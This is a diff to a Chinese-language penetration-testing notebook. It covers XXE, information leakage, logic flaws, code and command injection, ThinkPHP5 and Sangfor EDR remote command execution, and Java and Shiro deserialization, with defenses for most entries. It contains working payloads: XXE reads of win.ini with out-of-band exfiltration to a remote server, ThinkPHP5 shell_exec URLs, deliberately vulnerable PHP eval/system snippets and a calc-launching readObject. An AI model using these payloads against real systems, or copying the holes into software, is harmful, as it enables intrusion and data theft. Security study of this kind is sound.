@@ -445,7 +445,7 @@ file_put_contents($filename,$txt);
 
 ```xml
 <?xml version="1.0"?><name>vul!!</name>
-<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>		读取win.ini配置文件
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><name>&xxe;</name>		读取win.ini配置文件
 <?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "expect://whoami">]><root>&xxe;</root>		很难执行命令
 ```
 
@@ -479,11 +479,193 @@ file_put_contents($filename,$txt);
 将test.dtd放在远程服务器上，远程加载dtd文件:`<!ENTITY % file SYSTEM "file:///c:/windows/win.ini"><!ENTITY % all "<!ENTITY send SYSTEM 'http://169.254.115.76/?%file;'>">%all;`
 
 ```xml-dtd
-<?xml version="1.0"?><!DOCTYPE data SYSTEM "http://169.254.115.76/test.dtd"><data>&send;</data>
+<?xml version="1.0"?><!DOCTYPE data SYSTEM "http://169.254.115.76/test.dtd"><name>&send;</name>
 ```
 
 提交后，观察远程服务器上的访问日志是否存在测试目标的请求，win.ini文件内容以get提交的方式返回到远程服务器上
 
+## 防御方法
+
+- 对于php，常见的xml解析方法DOMDocument、SimpleXML、XMLReader都是基于expact解析器，默认不载入DTD，无漏洞。可以在php解析xml文件前使用libxml_disable_entity_loader(ture)禁止加载外部实体，并使用libxml_use_internal_errors()禁止报错
+- 对于Java，设置DocumentBuilderFactory dbf=DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);
+- 对用户输入的xml数据过滤
+
 # 服务器配置缺陷和信息泄露
 
+## 检测方式
+
+- 对网站目录进行直接访问查看是否可以浏览目录文件列表
+- 查看默认中间件示例文件是否存在
+- 通过目录扫描工具查看是否存在敏感目录
+- 通过文件扫描工具查看是否存在敏感文件
+- 通过手工提交畸形参数引起异常，查看异常信息
+- 通过抓包查看响应中是否有敏感信息
+
+## 防御方法
+
+- 设置自定义错误跳转页，避免非200响应状态返回默认错误信息
+- 关闭调试信息、中间件版本信息
+- 关闭错误输出，当web应用出错统一返回错误页面或跳转首页
+- 合理设置服务器文件访问权限
+
 # 业务逻辑漏洞
+
+## 未授权访问
+
+1. 成功登录系统后，记录各个功能页面url
+2. 重启浏览器并清空登录凭证，或使用隐私模式，访问url查看是否存在未授权访问
+
+### 防御方法
+
+- 明确特定角色对系统功能的访问权限
+- 检查并确保当前条件是授权访问的合适状态
+
+## 垂直越权
+
+1. 高权限登录系统
+2. 记录高权限功能页面url
+3. 登录低权限用户，或使用隐私模式
+4. 访问高权限url查看是否存在未授权访问
+
+### 防御方法
+
+- 调用功能前校验用户权限
+- 执行操作前验证用户身份
+
+## 验证码缺陷
+
+1. 验证码回传问题，可拦截验证码数据包，检查包中是否有验证码数据
+2. 验证码不刷新问题，可包含验证码多次重放，查看是否可用
+
+### 防御方法
+
+- 验证码使用后，立即销毁session，防止多次使用
+- 前后台均对验证码进行校验
+
+## 短信轰炸
+
+抓包"获取短信验证码"，多次重放查看是否收到多条验证码
+
+### 防御方法
+
+- 限制手机号的发送次数
+- 限制ip次数，超过拒绝发送
+- 限制手机号发送时间间隔，如两分钟
+- 发送短信需要图片验证码
+
+# 代码执行漏洞
+
+## 检测方式
+
+通过源代码白盒审计，如php重点关注eval，assert，execute，pref_replace函数的参数是否可控，是否严格过滤
+
+```php
+<?php
+$arg=$_GET['code'];
+eval("$arg;");
+?>
+```
+
+## 防御方法
+
+- 使用addslashes函数进行转义或使用黑白名单过滤
+- 禁用或减少使用可执行代码的函数
+- 限制web用户权限
+
+# 命令执行漏洞
+
+## 检测方式
+
+- 黑盒测试：关注网站的特殊功能，如ping测试、数据库备份
+- 白盒测试：查看命令执行函数参数是否没有过滤可控，如system，shell_exec，popen，passsthru，proc_popen，pcntl_exec
+
+```php
+<?php
+$arg=$_GET['cmd'];
+system("$arg",$ret);
+echo 'Return is:'.$ret;
+?>
+```
+
+深信服edr远程命令执行`https://xxx.xx/tool/log/c.php?strip_slashes=system&host=id`或者`http://xxx.xx/tool/log/c.php?strip_slashes=sytem&path=id`
+
+## 防御方法
+
+- 禁止执行外部应用程序或命令
+- 使用escapeshellarg，escapeshellcmd函数处理参数
+- 使用safe_modeexec_dir指定可执行的文件路径
+
+# thinkphp5远程命令执行
+
+thinkphp底层没有对控制器名进行严格的合法性校验，，导致在网站没有开启强制路由的情况下，用户可以调用任意类的任意方法，最终导致命令执行。`index.php?s=index/\namespace\class/method`会实例化\namespace\class类并执行method方法。
+
+- 利用index模块、\think\app控制器、同时利用invokefunction方法去反射调用call_user_func_array函数。使用的参数：`function=call_user_func_array`，`vars[0]=phpinfo`，`vars[1][]=-1`，可回显phpinfo。payload：`index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1`。
+- 利用index模块、\think\app控制器、同时利用invokefunction方法去反射调用call_user_func_array函数。使用的参数：`function=call_user_func_array`，`vars[0]=shell_exec`，`vars[1][]=id`，可回显id命令。payload：`index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=id`
+
+![thinkphp5.xrec](https://raw.githubusercontent.com/king-notfound404/Penetration-Zbook/main/img/thinkphp5.xrec.png)
+
+# java反序列化
+
+## Java序列号和反序列化demo
+
+window中运行
+
+```java
+import java.io.*;
+
+public class JavaSerializeExample{
+    public static void main(String[] args) throws Exception{
+        //定义myObj对象
+        MyObject myobj = new MyObject();
+        myobj.name="test";
+        //创建一个包含对象进行序列化信息的object.ser数据文件
+        ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("name:" + "object.ser"));
+        //writeObject()方法将myObject对象写入object.ser文件
+        os.writeObject(myobj);
+        os.close();
+        //从object.ser文件中反序列化对象
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("name:" + "object.ser"));
+        //通过readObject()方法读取对象
+        MyObject objectFromDisk=(MyObject)ois.readObject();
+        System.out.println(objectFromDisk.name);
+        ois.close();
+    }
+}
+class MyObject implements Serializable{
+    public String name;
+    //重写readObject()方法
+    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
+        in.defaultReadObject();
+        Runtime.getRuntime().exec("calc.exe");
+    }
+}
+```
+
+## 漏洞条件
+
+- 在应用程序中，通过方法调用、对象传递和反射机制等手段作为跳板，构造出利用链（Gadget Chain），如远程代码执行。
+- 当程序中的某个触发点在还原对象过程中，能成功执行构造的利用链，则成为触发点。
+- 利用工具[ysoserial](https://github.com/frohoff/ysoserial)
+
+## 反序列化数据特征
+
+- 可以使用xxd命令查看序列化数据的十六进制，头部为：ACED 0005
+- 一般截获的数据包中java序列化特征经过base64加密：rO0AB
+- 通过工具[SerializationDumper](https://github.com/NickstaDB/SerializationDumper)可以还原序列化数据内容
+
+# shiro反序列化漏洞
+
+shiro-550标志在于cookie中的rememberme字段经过base64+AES解密后就是序列化数据。而且AES填充模式为CBC，iv已知，key为硬编码。找到利用链就可以构造数据进行反序列化命令执行
+
+## 利用条件
+
+- 利用链：原生CommonsCollections 3.2.1、CommonsBeanutils
+- 触发点：硬编码key已知，可构造rememberMe字段
+
+## 工具
+
+https://github.com/feihong-cs/ShiroExploit-Deprecated
+
+https://github.com/j1anFen/shiro_attack
+
+# Fastjson暂不更新
